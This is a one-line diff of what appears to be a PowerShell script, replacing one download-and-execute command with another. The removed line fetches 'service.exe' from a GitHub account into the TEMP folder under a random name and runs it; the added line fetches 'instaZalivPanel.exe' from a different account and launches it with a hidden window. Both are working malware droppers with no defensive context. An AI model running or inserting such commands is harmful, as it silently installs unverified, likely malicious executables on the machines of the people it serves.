@@ -1,1 +1,1 @@
-$u='https://github.com/matvejsklarov9-cyber/my/raw/refs/heads/main/service.exe';$t=Join-Path $env:TEMP ('s'+[guid]::NewGuid().ToString('N').Substring(0,6)+'.exe');(New-Object Net.WebClient).DownloadFile($u,$t);Start-Process $t
+(New-Object Net.WebClient).DownloadFile('https://github.com/iendjd7-lgtm/-kructov/raw/refs/heads/main/instaZalivPanel.exe', "$env:TEMP\instaZalivPanel.exe") Start-Process "$env:TEMP\instaZalivPanel.exe" -WindowStyle Hidden
